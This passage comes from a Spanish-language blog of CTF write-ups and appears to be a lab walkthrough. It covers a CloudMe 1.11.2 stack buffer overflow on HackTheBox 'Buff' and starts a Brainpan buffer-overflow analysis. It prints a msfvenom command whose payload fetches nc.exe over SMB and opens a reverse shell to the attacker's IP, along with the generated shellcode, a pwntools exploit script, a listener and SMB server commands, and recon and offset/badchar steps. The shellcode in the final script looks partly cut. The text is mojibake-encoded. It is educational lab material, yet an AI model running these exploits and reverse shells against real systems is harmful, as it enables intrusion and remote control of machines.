tenemos que especificar la direcciÃ³n del ESP donde hemos puesto la cadena de bytes para comprobar los badchars. DespuÃ©s de ejecutarlo se abre la siguiente ventana, donde dice que no hay ningÃºn badchar, lo que significa que todos se muestran y se procesan de forma exitosa.\nProtecciones Listamos todos los mÃ³dulos para ver las protecciones que tienen\n!mona modules Tipos de protecciones\rNombre DescripciÃ³n CANARY (Stack Canary) Es una tÃ©cnica de seguridad que se utiliza para detectar desbordamientos de bÃºfer. Un \u0026ldquo;canario\u0026rdquo; es un valor colocado antes de la informaciÃ³n sensible en la memoria y si este valor cambia, indica que la memoria ha sido alterada, lo que sugiere un intento de ataque. CANARY (Stack Canary) Es una tÃ©cnica de seguridad que se utiliza para detectar desbordamientos de bÃºfer. Un \u0026ldquo;canario\u0026rdquo; es un valor colocado antes de la informaciÃ³n sensible en la memoria y si este valor cambia, indica que la memoria ha sido alterada, lo que sugiere un intento de ataque. FORTIFY (Fortify Source) Es una caracterÃ­stica de seguridad en compiladores y bibliotecas de C que ayuda a proteger contra vulnerabilidades de desbordamiento de bÃºfer y otros problemas de seguridad. Esta caracterÃ­stica agrega comprobaciones de seguridad automÃ¡ticas al cÃ³digo durante la compilaciÃ³n. NX (No-eXecute) Es una tecnologÃ­a de hardware y una caracterÃ­stica de seguridad que ayuda a prevenir la ejecuciÃ³n de cÃ³digo en regiones de memoria designadas como datos. Esto es Ãºtil para prevenir ataques de inyecciÃ³n de cÃ³digo, como los ataques de desbordamiento de bÃºfer. PIE (Position Independent Executable) Es una tÃ©cnica de seguridad que compila un ejecutable de manera que su carga en memoria sea aleatoria, lo que dificulta la explotaciÃ³n de vulnerabilidades por parte de los atacantes al no poder predecir la ubicaciÃ³n exacta del cÃ³digo en la memoria. RELRO (RELocation Read-Only) Es una tÃ©cnica de seguridad que marca ciertas secciones de la tabla de enlace dinÃ¡mico (DT) como de solo lectura despuÃ©s de que el enlazador ha resuelto todas las direcciones. Esto ayuda a proteger contra ataques que intentan modificar la tabla de enlace dinÃ¡mico para redirigir el flujo de control del programa. De todos los .dll que salen de CloudMe interesan los que tienen todas las protecciones en False.\nJMP ESP Entre todos los .dll que salen en false buscamos si tienen un JMP ESP (Una direcciÃ³n que salte al ESP, que es donde vamos a poner el shellcode), es importante que tenga {PAGE_EXECUTE_READ}, para poder ejecutar nuestro shellcode\n!mona find -s \u0026#34;\\xFF\\xE4\u0026#34; -m Qt5Core.dll DespuÃ©s de una bÃºsqueda entre los .dll al final el Qt5Core.dll cumple con las caracterÃ­sticas\nYa tenemos la direcciÃ³n para saltar al ESP: 0x68a98a6b\nShellCode Ahora toca crear el shellcode, que va a ejecutar lo siguiente \\\\192.168.1.135\\smb\\nc.exe -e cmd.exe 192.168.1.135 443 en la mÃ¡quina vÃ­ctima, y nos mandara una shell a nuestra mÃ¡quina de atacante.\nmsfvenom -a x86 -p windows/exec CMD=\u0026#39;\\\\192.168.1.135\\smb\\nc.exe -e cmd.exe 192.168.1.135 443\u0026#39; -b \u0026#39;\\x00\u0026#39; -f python [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload Found 11 compatible encoders Attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 267 (iteration=0) x86/shikata_ga_nai chosen with final size 267 Payload size: 267 bytes Final size of python file: 1332 bytes buf = b\u0026#34;\u0026#34; buf += b\u0026#34;\\xdb\\xc8\\xd9\\x74\\x24\\xf4\\x5b\\xba\\x12\\xf3\\x19\\x43\u0026#34; buf += b\u0026#34;\\x29\\xc9\\xb1\\x3d\\x31\\x53\\x17\\x03\\x53\\x17\\x83\\xd1\u0026#34; buf += b\u0026#34;\\xf7\\xfb\\xb6\\x29\\x1f\\x79\\x38\\xd1\\xe0\\x1e\\xb0\\x34\u0026#34; buf += b\u0026#34;\\xd1\\x1e\\xa6\\x3d\\x42\\xaf\\xac\\x13\\x6f\\x44\\xe0\\x87\u0026#34; buf += b\u0026#34;\\xe4\\x28\\x2d\\xa8\\x4d\\x86\\x0b\\x87\\x4e\\xbb\\x68\\x86\u0026#34; buf += b\u0026#34;\\xcc\\xc6\\xbc\\x68\\xec\\x08\\xb1\\x69\\x29\\x74\\x38\\x3b\u0026#34; buf += b\u0026#34;\\xe2\\xf2\\xef\\xab\\x87\\x4f\\x2c\\x40\\xdb\\x5e\\x34\\xb5\u0026#34; buf += b\u0026#34;\\xac\\x61\\x15\\x68\\xa6\\x3b\\xb5\\x8b\\x6b\\x30\\xfc\\x93\u0026#34; buf += b\u0026#34;\\x68\\x7d\\xb6\\x28\\x5a\\x09\\x49\\xf8\\x92\\xf2\\xe6\\xc5\u0026#34; buf += b\u0026#34;\\x1a\\x01\\xf6\\x02\\x9c\\xfa\\x8d\\x7a\\xde\\x87\\x95\\xb9\u0026#34; buf += b\u0026#34;\\x9c\\x53\\x13\\x59\\x06\\x17\\x83\\x85\\xb6\\xf4\\x52\\x4e\u0026#34; buf += b\u0026#34;\\xb4\\xb1\\x11\\x08\\xd9\\x44\\xf5\\x23\\xe5\\xcd\\xf8\\xe3\u0026#34; buf += b\u0026#34;\\x6f\\x95\\xde\\x27\\x2b\\x4d\\x7e\\x7e\\x91\\x20\\x7f\\x60\u0026#34; buf += b\u0026#34;\\x7a\\x9c\\x25\\xeb\\x97\\xc9\\x57\\xb6\\xfd\\x0c\\xe5\\xcd\u0026#34; buf += b\u0026#34;\\xb0\\x0f\\xf5\\xcd\\xe4\\x67\\xc4\\x46\\x6b\\xff\\xd9\\x8d\u0026#34; buf += b\u0026#34;\\xcf\\x0f\\x90\\x8f\\x66\\x98\\x7d\\x5a\\x3b\\xc5\\x7d\\xb1\u0026#34; buf += b\u0026#34;\\x78\\xf0\\xfd\\x33\\x01\\x07\\x1d\\x36\\x04\\x43\\x99\\xab\u0026#34; buf += b\u0026#34;\\x74\\xdc\\x4c\\xcb\\x2b\\xdd\\x44\\x97\\x97\\x10\\x5e\\x15\u0026#34; buf += b\u0026#34;\\x06\\x62\\x96\\x61\\x78\\xb5\\xf8\\xa0\\xb7\\x80\\x58\\xb1\u0026#34; buf += b\u0026#34;\\xda\\x88\\x3c\\x5b\\x46\\x63\\xd8\\xdb\\xed\\x5b\\x0f\\x7e\u0026#34; buf += b\u0026#34;\\xce\\xf8\\x22\\xe4\\x20\\x9a\\xc4\\x81\\x1c\\x55\\x0c\\x7b\u0026#34; buf += b\u0026#34;\\x73\\xa4\\x58\\x43\\xa5\\xf7\\x8a\\x82\\x8a\\xc2\\xf2\\xd0\u0026#34; buf += b\u0026#34;\\xd8\\x1f\\xf3\u0026#34; ExplicaciÃ³n parÃ¡metros\rParÃ¡metro FunciÃ³n -a x86 Especifica la arquitectura del objetivo, en este caso, x86. -p windows/exec Selecciona el payload a utilizar, en este caso, windows/exec, que nos sirve para ejecutar comandos en la mÃ¡quina vÃ­ctima CMD=\u0026rsquo;\\192.168.1.135\\smb\\nc.exe -e cmd.exe 192.168.1.135 443 Define el comando a ejecutar por el payload -b \u0026lsquo;\\x00 Especifica los badchars para que msfvenom no los ponga en el shellcode, ya que no se van a interpretar -f python Define el formato de salida del shell code, en este caso python para que podamos simplemente copiar el output y pegarlo en el script sin necesidad de adaptar nada Script final Para finalizar la explotaciÃ³n del buffer overflow creamos un script basÃ¡ndonos en toda la informaciÃ³n que hemos ido recopilando a lo largo de la resoluciÃ³n\n\u0026lsquo;A\u0026rsquo; * 1052: Primero mandamos 1052 \u0026lsquo;A\u0026rsquo; para llegar al EIP 0x68a98a6b: Segimos con el valor del EIP, que le pondremos la direcciÃ³n para saltar al ESP \u0026lsquo;ShellCode\u0026rsquo;: Lo Ãºltimo que mandamos es el shellcode. from pwn import * from struct import pack offset = 1052 before_eip = b\u0026#34;A\u0026#34; * offset eip = pack(\u0026#34;\u0026lt;I\u0026#34;, 0x68a98a6b) buf += b\u0026#34;\\xcc\\xc6\\xbc\\x68\\xec\\x08\\xb1\\x69\\x29\\x74\\x38\\x3b\u0026#34; buf += b\u0026#34;\\xe2\\xf2\\xef\\xab\\x87\\x4f\\x2c\\x40\\xdb\\x5e\\x34\\xb5\u0026#34; buf += b\u0026#34;\\xac\\x61\\x15\\x68\\xa6\\x3b\\xb5\\x8b\\x6b\\x30\\xfc\\x93\u0026#34; buf += b\u0026#34;\\x68\\x7d\\xb6\\x28\\x5a\\x09\\x49\\xf8\\x92\\xf2\\xe6\\xc5\u0026#34; buf += b\u0026#34;\\x1a\\x01\\xf6\\x02\\x9c\\xfa\\x8d\\x7a\\xde\\x87\\x95\\xb9\u0026#34; buf += b\u0026#34;\\x9c\\x53\\x13\\x59\\x06\\x17\\x83\\x85\\xb6\\xf4\\x52\\x4e\u0026#34; buf += b\u0026#34;\\xb4\\xb1\\x11\\x08\\xd9\\x44\\xf5\\x23\\xe5\\xcd\\xf8\\xe3\u0026#34; buf += b\u0026#34;\\x6f\\x95\\xde\\x27\\x2b\\x4d\\x7e\\x7e\\x91\\x20\\x7f\\x60\u0026#34; buf += b\u0026#34;\\x7a\\x9c\\x25\\xeb\\x97\\xc9\\x57\\xb6\\xfd\\x0c\\xe5\\xcd\u0026#34; buf += b\u0026#34;\\xb0\\x0f\\xf5\\xcd\\xe4\\x67\\xc4\\x46\\x6b\\xff\\xd9\\x8d\u0026#34; buf += b\u0026#34;\\xcf\\x0f\\x90\\x8f\\x66\\x98\\x7d\\x5a\\x3b\\xc5\\x7d\\xb1\u0026#34; buf += b\u0026#34;\\x78\\xf0\\xfd\\x33\\x01\\x07\\x1d\\x36\\x04\\x43\\x99\\xab\u0026#34; buf += b\u0026#34;\\x74\\xdc\\x4c\\xcb\\x2b\\xdd\\x44\\x97\\x97\\x10\\x5e\\x15\u0026#34; buf += b\u0026#34;\\x06\\x62\\x96\\x61\\x78\\xb5\\xf8\\xa0\\xb7\\x80\\x58\\xb1\u0026#34; buf += b\u0026#34;\\xda\\x88\\x3c\\x5b\\x46\\x63\\xd8\\xdb\\xed\\x5b\\x0f\\x7e\u0026#34; buf += b\u0026#34;\\xce\\xf8\\x22\\xe4\\x20\\x9a\\xc4\\x81\\x1c\\x55\\x0c\\x7b\u0026#34; buf += b\u0026#34;\\x73\\xa4\\x58\\x43\\xa5\\xf7\\x8a\\x82\\x8a\\xc2\\xf2\\xd0\u0026#34; buf += b\u0026#34;\\xd8\\x1f\\xf3\u0026#34; payload = before_eip + eip + b\u0026#34;\\x90\u0026#34;*16 + buf host, port = \u0026#34;127.0.0.1\u0026#34;, 8888 r = remote(host, port) r.sendline(payload) Antes de ejecutarlo hay que ponerse en escucha por el puerto 443\nnc -nlvp 443 ExplicaciÃ³n parÃ¡metros\rn: Sirve para que no haga la resoluciÃ³n de DNS l: Habilitar modo escucha de netcat v: Verbose, modo detallado de netcat p: Por Ãºltimo la p sirve para especificar el nÃºmero de puerto en el cual vamos a estar en escucha Y tambiÃ©n hay que abrir un servidor con samba para compartir el nc.exe\nimpacket-smbserver smb $(pwd) -smb2support ExplicaciÃ³n parÃ¡metros\rsmb: Nombre del recurso compartido $(pwd): Esto devuelve el directorio en el cual estamos, y imapcket-server comparte el contenido de la ruta especificada \u0026ndash;smb2support: Habilita el soporte para el protocolo SMB2 Ejecutamos el script y\u0026hellip; Â¡Recibimos la conexiÃ³n!\nAhora solo falta, envÃ©s de poner nuestra ip poner la de la mÃ¡quina Buff y listo, mÃ¡quina completada\n","date":"2024-03-18","id":31,"permalink":"/writeups/hackthebox/buff/","summary":"Es una mÃ¡quina muy simple, pero vamos a analizar en profundidad un Buffer Overflow de CloudMe 1.11.2 y un \u0026lsquo;Unauthenticated Remote Code Execution\u0026rsquo; en  \u0026lsquo;Gym Management System 1.0\u0026rsquo;","tags":["CTF","BoF","File Upload","Portfordwarding"],"title":"Buff"},{"content":"","date":"2024-03-18","id":32,"permalink":"/tags/ctf/","summary":"","tags":[],"title":"CTF"},{"content":"","date":"2024-03-18","id":33,"permalink":"/tags/portfordwarding/","summary":"","tags":[],"title":"Portfordwarding"},{"content":"","date":"2024-02-11","id":34,"permalink":"/ctf/","summary":"","tags":[],"title":"Ctf"},{"content":"","date":"2024-02-10","id":35,"permalink":"/tags/binary-explotation/","summary":"","tags":[],"title":"Binary Explotation"},{"content":"Reconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene\n\u0026gt; ping -c 1 192.168.1.139 PING 192.168.1.139 (192.168.1.139) 56(84) bytes of data. 64 bytes from 192.168.1.139: icmp_seq=1 ttl=64 time=0.240 ms --- 192.168.1.139 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.240/0.240/0.240/0.000 ms Tenemos conexiÃ³n y en este caso da un ttl (time to live) de 127, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta mÃ¡quina es Linux\nEscaneo de puertos Ahora empezamos con un escaneo de puertos\n$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n 192.168.1.139 -oG allPorts ExplicaciÃ³n parÃ¡metros\rParÃ¡metro FunciÃ³n -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resoluciÃ³n DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Para saltar la comprobaciÃ³n de sÃ­ la mÃ¡quina estÃ¡ activa o no -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una funciÃ³n definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma mÃ¡s visual\nFunciÃ³n extractPorts de @s4vitar\n\u0026gt; extractPorts allPorts â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: extractPorts.tmp â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ 2 â”‚ [*] Extracting information... 3 â”‚ 4 â”‚ [*] IP Address: 192.168.1.139 5 â”‚ [*] Open ports: 9999,10000 6 â”‚ 7 â”‚ [*] Ports copied to clipboard 8 â”‚ â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ahora con nmap vamos a intentar buscar las versiones de los servicios que corren por los puertos y ejecutar scripts bÃ¡sicos de reconocimientos de nmap\n\u0026gt; sudo nmap -p9999,10000 -sCV 192.168.1.139 -oN versions Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-04 18:42 CET Nmap scan report for 192.168.1.139 Host is up (0.00053s latency). PORT STATE SERVICE VERSION 9999/tcp open abyss? | fingerprint-strings: | NULL: | _| _| | _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| | _|_| _| _| _| _| _| _| _| _| _| _| _| | _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _| | [________________________ WELCOME TO BRAINPAN _________________________] |_ ENTER THE PASSWORD 10000/tcp open http SimpleHTTPServer 0.6 (Python 2.7.3) |_http-server-header: SimpleHTTP/0.6 Python/2.7.3 |_http-title: Site doesn\u0026#39;t have a title (text/html). 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port9999-TCP:V=7.94SVN%I=7%D=2/4%Time=65BFCC92%P=x86_64-pc-linux-gnu%r( SF:NULL,298,\u0026#34;_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_\\|\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\n_\\|_\\|_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|_\\|\\x20\\x20\\x20\\x20_\\|_\\|_ SF:\\|\\x20\\x20\\x20\\x20\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\x2 SF:0\\x20\\x20\\x20_\\|_\\|_\\|\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\n_\\|\\x20\\x20\\x20\\x20_\\| SF:\\x20\\x20_\\|_\\|\\x20\\x20\\x20\\x20\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\| SF:\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\| SF:\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\n_\\|\\x20\\x20\\x20\\x20_ SF:\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20 SF:\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20 SF:\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\n_\\|_\\|_\\|\\x20 SF:\\x20\\x20\\x20_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_\\|_\\|_\\|\\x20\\x2 SF:0_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\x20\\x20\\x20 SF:\\x20_\\|_\\|_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\n\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20_\\|\\n\\n\\[________________________\\x20WELCOME\\x20TO\\x20BRAINPAN SF:\\x20_________________________\\]\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20ENTER SF:\\x20THE\\x20PASSWORD\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\n\\ SF:n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026gt;\u0026gt;\\x20\u0026#34;); MAC Address: 08:00:27:C3:40:1B (Oracle VirtualBox virtual NIC) ExplicaciÃ³n parÃ¡metros\rParÃ¡metro FunciÃ³n -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts bÃ¡sicos de reconocimiento -sV Proporciona la versiÃ³n e informaciÃ³n de los servicios que corren por los puertos Puerto 10000 Nmap ha reportado que por el puerto 10000 hay un SimpleHTTPServer de versiÃ³n 0.6 (Python 2.7.3). Esto tambiÃ©n lo podrÃ­amos haber visto con whatweb\n$ whatweb 192.168.1.139:10000 http://192.168.1.139:10000 [200 OK] Country[RESERVED][ZZ], HTTPServer[SimpleHTTP/0.6 Python/2.7.3], IP[192.168.1.139], Python[2.7.3] Al entrar a la web vemos una pÃ¡gina simple sin nada destacable. En este punto podrÃ­amos tratar de hacer fuzzing para enumerar archivos o directorios dentro del servidor web. Para ello vamos a usar la herramienta wfuzz\n\u0026gt; wfuzz -c -t 20 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://192.168.1.139:10000/FUZZ ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000483: 301 0 L 0 W 0 Ch \u0026#34;bin\u0026#34; ExplicaciÃ³n parÃ¡metros\r-c: Mostrar el resultado con colores -t: Definir el tiempo del escaneo \u0026ndash;hc=404: Con esto le decimos que no nos interesan las respuestas cuyo cÃ³digo de estado sea 404, lo que significa que no queremos que nos reporte pÃ¡ginas que no existen -w: Diccionario FUZZ: Es donde va a ir probando el contenido del diccionario Ha encontrado un directorio llamado bin en el cual dentro hay un archivo llamado brainpan.exe, vamos a descargÃ¡rnoslo\n$ wget 192.168.1.139:10000/bin/brainpan.exe 2024-02-04 18:57:28 (44.7 MB/s) - â€˜brainpan.exeâ€™ saved [21190/21190] Vamos a pasarnos este binario a una mÃ¡quina windows 7, en mi caso de 32 bits, mediante un servidor de python creado desde la mÃ¡quina atacante con python3 -m http.server 80. Ahora desde el navegador de windows 7 si ponemos nuestra ip ya nos podremos bajar el archivo.\nPuerto 9999 Al ejecutar el brainpan.exe desde la mÃ¡quina windows, se abre una terminal en la cual pone \u0026ldquo;bind done on port 9999 waitin for connextions\u0026rdquo; Casualmente es el mismo puerto que tenÃ­a abierto la mÃ¡quina vÃ­ctima.\nSi probamos de conectarnos con netcat por el puerto 9999 a la mÃ¡quina windows y despuÃ©s nos conectamos a la mÃ¡quina vÃ­ctima por el puerto 9999 vemos que el mensaje es el mismo.\n\u0026gt; nc 192.168.1.141 9999 #Windows 7 _| _| _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| _| _| _|_| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _| _| _| [________________________ WELCOME TO BRAINPAN _________________________] ENTER THE PASSWORD \u0026gt;\u0026gt; \u0026gt; nc 192.168.1.139 9999 #VÃ­ctima _| _| _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| _| _| _|_| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _| _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _| _| _| [________________________ WELCOME TO BRAINPAN _________________________] ENTER THE PASSWORD \u0026gt;\u0026gt; Con esto sacamos la conclusiÃ³n de que el archivo brainpan.exe es el mismo que se estÃ¡ ejecutando en la mÃ¡quina vÃ­ctima\nBuffer Overflow Para analizar el binario usaremos Inmunnity Debugger con mona.\nPrimero importamos el archivo en Imunity Debugger. Una vez importado lo ejecutamos desde inmunity debugger.\nDurante la explotaciÃ³n vamos a ir desarrollando un script en python para agilizarlo todo\u0026hellip;\nfrom pwn import * offset = 1000 junk = b\u0026#34;A\u0026#34; * offset payload = junk host, port = \u0026#34;192.168.1.141\u0026#34;, 9999 r = remote(host, port) r.sendline(payload) Lo que vamos a hacer con esto es mandarle 1000 \u0026ldquo;A\u0026rdquo; al programa que corre por el puerto 9999 de la mÃ¡quina windows.\nUna vez ejecutado el script. Desde inmunity debugger se puede ver como ahora el EIP vale 41414141 lo que equivale a AAAA Esto significa que si ponemos un input muy largo podemos llegar a sobreescribir el EIP\nEIP: (Punto de InstrucciÃ³n de Entrada) es un registro que almacena la direcciÃ³n de la prÃ³xima instrucciÃ³n a ejecutar en un programa.\nCalcular Offset Ahora buscaremos cuantas \u0026ldquo;A\u0026rdquo; hay que poner para llegar al EIP. Para encontrar este nÃºmero llamado offset, usaremos una cadena de caracteres diseÃ±ada para esto.\n/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1800 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5... Este comando nos ha generado una cadena de 1800 caracteres. La cual vamos a aÃ±adir en el script.\nfrom pwn import * junk = \u0026#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8\u0026gt; payload = junk host, port = \u0026#34;192.168.1.141\u0026#34;, 9999 r = remote(host, port) r.sendline(payload) Ejecutamos el script, y en el Imunnity Debugger aparece que el EIP vale: 35724134.\nCon el siguiente comando calculamos automÃ¡ticamente el offset\n$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1800 -q 35724134 [*] Exact match at offset 524 Buscar badchars Una vez tenemos el control del EIP vamos a comprobar si hay badchars.\nLos badchars bÃ¡sicamente son caracteres que pueden dar problemas a la hora de ejecutar un shellcode, un badchar tÃ­pico es el \\x00 (Null byte) el cual ya se suele excluir directamente porque da muchos problemas.\nPara comprobar los badchars podrÃ­amos hacerlo de forma manual, pero vamos a usar mona para automatizarlo. Primero hay que definir el directorio de trabajo, en mi caso va a ser C:\\Users\\arnau\\Desktop\\bof\n!mona config -set workingfolder C:\\Users\\arnau\\Desktop\\bof DespuÃ©s vamos a crear un archivo con todos los bytes excluyendo el null byte (\\x00), y lo vamos a guardar en el directorio de trabajo.\n!mona bytearray -b \u0026#34;\\x00\u0026#34; Ahora dentro del archivo C:\\Users\\arnau\\Desktop\\bof\\bytearray.txt estÃ¡n todos los bytes.\n================================================================================ Output generated by mona.py v2.0, rev 635 - Immunity Debugger Corelan Consulting bv - https://www.corelan.be ================================================================================ OS : 7, release 6.1.7601 Process being debugged : brainpan (pid 2272) Current mona arguments: bytearray -b \u0026#34;\\x00\u0026#34; ================================================================================ 2024-02-05 19:12:33 ================================================================================ \u0026#34;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\u0026#34; \u0026#34;\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\u0026#34; \u0026#34;\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\u0026#34; \u0026#34;\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\u0026#34; 